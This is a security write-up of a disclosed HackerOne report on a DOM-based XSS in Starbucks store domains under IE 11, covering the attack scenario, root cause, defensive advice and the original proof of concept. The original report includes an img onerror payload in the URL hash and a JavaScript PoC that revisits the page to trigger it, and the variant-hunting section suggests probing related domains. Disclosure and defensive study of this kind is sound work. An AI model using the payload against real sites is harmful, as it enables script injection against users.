# DOM-based XSS in store.starbucks.co.uk on IE 11

## Metadata
- **Source:** HackerOne
- **Report:** 241619 | https://hackerone.com/reports/241619
- **Submitted:** 2017-06-20
- **Reporter:** albinowax
- **Program:** Starbucks
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** DOM-based XSS, Client-side Template Injection, Unsafe innerHTML usage
- **CVEs:** None
- **Category:** web-api

## Summary
A DOM-based XSS vulnerability exists in store.starbucks.co.uk and related domains (store.starbucks.fr, store.starbucks.ca) where unsanitized URL hash fragments are passed to jQuery's parseHTML function and rendered via innerHTML. The vulnerability requires IE 11 and specific timing to trigger, as the application reads the hash during initialization and later processes it through a vulnerable code path.

## Attack scenario
1. Attacker crafts a malicious URL with XSS payload in the URL hash fragment: https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>
2. Attacker sends this URL to a victim using IE 11
3. Victim visits the URL, initial page load occurs without executing payload
4. After 5 seconds (or via attacker-controlled timing), the application re-processes the hash value during page initialization or tab functionality
5. The hash value containing the payload is extracted and passed to jQuery parseHTML function
6. parseHTML processes the untrusted HTML and calls innerHTML, executing the JavaScript payload

## Root cause
The application extracts the URL hash fragment without proper sanitization and passes it directly to jQuery's parseHTML function, which ultimately uses innerHTML to render the content. IE 11's handling of certain HTML entities combined with the application's tab initialization logic allows the payload to execute when the hash is processed a second time.

## Attacker mindset
An attacker would exploit the browser-specific nature of this vulnerability by crafting URLs that bypass typical XSS filters. The timing requirement suggests the attacker understands the application's initialization sequence and can leverage the gap between initial load and secondary processing. This could be used for credential theft, malware distribution, or session hijacking on an e-commerce platform.

## Defensive takeaways
- Never pass user-controlled input (including URL fragments) to innerHTML or jQuery parseHTML without proper sanitization
- Use textContent instead of innerHTML when rendering user-supplied data
- Implement Content Security Policy (CSP) to restrict script execution
- Use a security-focused HTML sanitization library (e.g., DOMPurify) before rendering any user input
- Avoid relying on browser-specific behaviors; test extensively across all supported browsers including IE 11
- Implement input validation on URL parameters and hash fragments
- Use framework-level templating engines with automatic escaping rather than manual DOM manipulation

## Variant hunting
Check other DOM manipulation points that use location.hash, location.search, or other URL sources
Test all other domains under Starbucks (store.starbucks.* across all regions) for similar patterns
Search for other jQuery parseHTML usage in the codebase that may accept user input
Examine tab functionality and other initialization routines that access window properties
Test with different URL-encoded payloads and HTML entity variations for IE 11 bypass techniques
Check Edge and other IE-based browsers for similar vulnerabilities

## MITRE ATT&CK
- T1190
- T1598
- T1566

## Notes
This vulnerability demonstrates the danger of relying on browser-specific quirks and the importance of defense-in-depth. The requirement for IE 11 and timing suggests this may have been patched differently in modern browsers, but the root cause (unsafe HTML rendering of user input) is a fundamental flaw. The stack trace clearly shows the data flow from hash access to innerHTML execution. The vulnerability affects multiple international Starbucks store domains, indicating a shared codebase issue.

## Full report
<details><summary>Expand</summary>

We've found DOM XSS on store.starbucks.co.uk and other related domains such as store.starbucks.fr and store.starbucks.ca.  It appears to be a JQuery based DOM XSS in the parseHTML sink. In order to trigger the XSS you need to use IE11 and the PoC will visit the url first, wait 5 seconds and then revisit the same url to trigger the XSS. 

Here is the PoC:
<script>
function poc() {
        var url = 'https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>', 
            win = window.open(url);
        setTimeout(function(){win.location=url}, 5000);
}
</script>
<a href="#" onclick="poc();">PoC visit using IE11</a>

It may be possible to make this PoC work in Edge, too. Here is a stacktrace of where the source is accessed:

Error
    at Object.get hash [as hash] (<anonymous>:1:29568)
    at Object.initialize (eval at <anonymous> (:1:31716), <anonymous>:1:2524)
    at HTMLDivElement.eval (eval at <anonymous> (:1:31716), <anonymous>:1:6085)
    at Function.each (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:28:379)
    at a.fn.init.each (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:22:134)
    at a.fn.init.$.fn.tabs (eval at <anonymous> (:1:31716), <anonymous>:1:765)
    at HTMLDocument.<anonymous> (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:528:82)
    at r (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:69:440)
    at Object.fireWith [as resolveWith] (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:71:228)
    at Function.ready (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:24:415)
    at HTMLDocument.ga (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:19:386)
Here is a stack trace of where the sink is executed:

Error
    at HTMLDivElement.set [as innerHTML] (<anonymous>:1:41512)
    at Function.buildFragment (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:136:359)
    at Function.parseHTML (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:26:309)
    at a.fn.init (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:193:56)
    at g (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:18:396)
    at Object.initialize (eval at <anonymous> (:1:31716), <anonymous>:1:2495)
    at HTMLDivElement.eval (eval at <anonymous> (:1:31716), <anonymous>:1:6085)
    at Function.each (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:28:379)
    at a.fn.init.each (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:22:134)
    at a.fn.init.$.fn.tabs (eval at <anonymous> (:1:31716), <anonymous>:1:765)
    at HTMLDocument.<anonymous> (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:528:82)
    at r (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:69:440)
    at Object.fireWith [as resolveWith] (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:71:228)
    at Function.ready (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:24:415)
    at HTMLDocument.ga (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:19:386)


</details>

---
*Analysed by Claude on 2026-05-12*
